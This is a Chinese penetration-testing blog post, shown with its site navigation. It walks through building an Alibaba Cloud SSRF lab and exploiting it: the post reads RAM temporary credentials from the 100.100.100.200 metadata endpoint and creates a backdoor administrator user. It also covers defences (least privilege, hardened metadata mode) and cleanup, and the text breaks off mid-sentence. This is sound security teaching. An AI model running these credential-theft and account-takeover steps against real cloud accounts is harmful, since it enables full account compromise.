---
title: 从云服务器 SSRF 漏洞到接管你的阿里云控制台 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17081117.html
source: 博客园 - 渗透测试中心
date: 2023-02-01
fetch_date: 2025-10-04T05:20:57.611103
---

# 从云服务器 SSRF 漏洞到接管你的阿里云控制台 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [从云服务器 SSRF 漏洞到接管你的阿里云控制台](https://www.cnblogs.com/backlion/p/17081117.html "发布于 2023-01-31 22:52")

## 0x00 前言

本文将以阿里云为例，对云服务中的一些攻防手法进行演示，首先利用 Terraform 进行 ECS SSRF 漏洞环境的搭建，然后通过实例中存在的 SSRF 漏洞一步步拿下该云服务账户的所有的阿里云服务权限。

## 0x01 环境搭建

本文采用 TerraformGoat 进行靶场的搭建，TerraformGoat 靶场地址：[https://github.com/HuoCorp/TerraformGoat(opens new window)](https://github.com/HuoCorp/TerraformGoat)

在部署靶场时，需要用到你的阿里云 AccessKey，为了避免影响到你的云上生产环境，因此这里强烈建议使用非生产环境的 AccessKey，不要和生产环境使用同一个账号。

> 由于 TerraformGoat 工具的迭代更新，下述环境搭建的方法已失效，现在部署的方法更加方便友好，具体部署方法请参见上面的 TerraformGoat 靶场地址。

接下来开始搭建靶场，首先克隆靶场项目到本地，并构建下载靶场所需的依赖。

```
git clone https://github.com/HuoCorp/TerraformGoat.git --depth 1
cd TerraformGoat
docker build . -t terraformgoat:v0.0.3
docker run -itd --name terraformgoat terraformgoat:v0.0.3
docker exec -it terraformgoat /bin/bash
```

如果 github 访问较慢，可以给终端挂上代理

```
proxy_url="127.0.0.1:1080" && export https_proxy=http://$proxy_url http_proxy=http://$proxy_url all_proxy=socks5://$proxy_url
```

在进入容器后，容器会提示选择接下来要使用的云服务提供商，这里以阿里云服务为例，输入 2 选择阿里云后回车。

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225117204-1980699701.png)

进入到阿里云 ECS SSRF 靶场路径下，并配置你的 AccessKey

```
cd /TerraformGoat/aliyun/ecs/ecs_ssrf/
aliyun configure
```

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225118193-701724140.png)

部署 SSRF 靶场

```
terraform init
terraform apply
```

如果 init 初始化比较慢，挂上代理即可

在 apply 期间，会提示 Enter a value，这时输入 yes 回车即可。

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225137298-63570412.png)

在 Outputs 处，可以看到返回的靶场地址，访问这个地址，可以看到 SSRF 测试靶场页面，这时就说明环境搭建完了。

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225138389-921342286.png)

## 0x02 环境利用

当前环境存在 SSRF 漏洞，但和常规 SSRF 所处的环境不同，这里的 SSRF 漏洞是出现在云服务器上的，这也就意味着我们可以通过这个 SSRF 漏洞获取到该服务器的元数据信息。

访问元数据

```
http://100.100.100.200/latest/meta-data
```

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225139477-87423798.png)

在返回的结果中，可以看到当前环境存在 ram/ 目录，这也就意味着当前云服务器配置了 RAM 角色，这样我们可以获取到临时凭证了。

通过元数据获取临时凭证

> 这里 URL 中的 huocorp-terraform-goat-role 是 RAM 角色名称，可以通过访问 http://100.100.100.200/latest/meta-data/ram/security-credentials/ 获取到。

```
http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role
```

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225156034-2118635665.png)

将临时凭证配置到 aliyun 命令行工具里。

```
aliyun configure --mode StsToken
```

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225157311-1794465312.png)

创建子用户，并赋予管理员权限

```
aliyun ram CreateUser --UserName teamssix
aliyun ram CreateLoginProfile --UserName teamssix --Password TeamsSix@666
aliyun ram AttachPolicyToUser --PolicyType System --PolicyName AdministratorAccess --UserName teamssix
```

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225158348-1911636520.png)

访问 [https://signin.aliyun.com (opens new window)](https://signin.aliyun.com/)页面，通过 RAM 用户进行登录，这里的用户格式为 username@company-alias，其中 username 就是刚刚创建的用户名，company-alias 可以通过下面的这个命令获取到。

```
aliyun ram GetAccountAlias
```

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225201677-896717901.png)

这里的 AccountAlias 就是我们需要的 company-alias，接下来就可以登录控制台了。

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225202783-1613916352.png)

输入刚才创建用户时的密码

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225203985-212994692.png)

登录后，就可以看到目标的控制台了。

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225206591-1683868747.png)

由于刚才在创建用户时，赋予了 AdministratorAccess 权限，因此在 RAM 访问控制处可以看到，当前账号拥有管理所有阿里云资源的权限。

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225207786-84884398.png)

在云服务 ECS 实例中也可以看到我们刚才搭建的那台 SSRF 靶场服务器。

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225208760-1260587526.png)

至此，就实现了利用云服务器上的 SSRF 漏洞接管了阿里云控制台。

> 另外这个环境里还放了一个 flag 文件，你如果感兴趣的话，可以动手去尝试找到这个 flag，Writeup 地址：[https://github.com/HuoCorp/TerraformGoat/tree/main/aliyun/ecs/ecs\_ssrf(opens new window)](https://github.com/HuoCorp/TerraformGoat/tree/main/aliyun/ecs/ecs_ssrf)

## 0x03 防御措施

这个环境的问题除了存在 SSRF 外，还有另外两个主要的问题：

1. RAM 角色权限过大，导致可以通过该角色的权限进行创建子用户以及给子用户授予高权限等操作
2. 元数据未做加固访问，导致一旦目标存在 SSRF 或目标权限被拿下，元数据就存在被获取的风险

那么针对第一个 RAM 角色权限过大的问题，主要还是需要使用者严格遵守权限最小化的原则，在为 RAM 角色赋予权限时，避免赋予过高的权限，只赋予自己所需要的权限，这样可以将影响程度降到最低，但是这并不能治本。

针对第二个元数据未做加固访问的问题，可以将实例上的元数据访问模式设置为加固模式，这是一种治本的方法，将元数据访问模式设置为加固模式有以下两种方法：

1. 在创建实例时，可以在「系统配置」的「高级选项」中将「实例元数据访问模式」设置为「仅加固模式」

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225209857-101210772.png)

1. 在已经创建好的实例中，可以在阿里云 OpenAPI 中开启元数据强制使用 Token 访问，OpenAPI 地址：[https://next.api.aliyun.com/api/Ecs/2014-05-26/ModifyInstanceMetadataOptions(opens new window)](https://next.api.aliyun.com/api/Ecs/2014-05-26/ModifyInstanceMetadataOptions)

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225211023-811956951.png)

将 HttpTokens 设置为 required 即表示强制使用加固模式，此时再访问元数据就会提示 403 了。

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225212158-993266326.png)

值得一提的是，将元数据设置为加固模式可以防止通过 SSRF 获取到元数据，但如果实例权限被拿下，那么红队还是可以通过在实例上执行获取 token 的命令，然后利用该 token 获取到元数据。

在 Linux 实例中获取 token 的命令如下：

```
TOKEN=`curl -X PUT "http://100.100.100.200/latest/api/token" -H "X-aliyun-ecs-metadata-token-ttl-seconds: 21600"`
```

通过 token 获取元数据

```
curl -H "X-aliyun-ecs-metadata-token: $TOKEN"  http://100.100.100.200/latest/meta-data/
```

![](https://img2023.cnblogs.com/blog/1049983/202301/1049983-20230131225213143-2072985310.png)

对于 Windows 实例下的获取方法可以参考阿里云官方文档：[https://help.aliyun.com/document\_detail/108460.htm(opens new window)](https://help.aliyun.com/document_detail/108460.htm)

> 将元数据访问模式设置为加固模式进而防御 SSRF 漏洞的这个方法由 2h0ng 师傅提供

## 0x04 环境删除

删除创建的子账号

```
aliyun ram DetachPolicyFromUser --PolicyType System --PolicyName AdministratorAccess --UserName teamssix
aliyun ram DeleteUser --UserName teamssix
```

删除 SSRF 靶场环境，在使用完靶场后，记得及时删除，因为这里创建的云服务是按时间计费的，该靶场实例的价格为每小时 0.17 元人民币。

> 在销毁靶场之前，记得把 AccessKey 配置成最开始的 AccessKey，配置命令：aliyun configure --mode AK

```
terraform destroy
```

如果想清除 TerraformGoat，可以使用以下命令，如果以后还想进行云上攻防的学习，则可...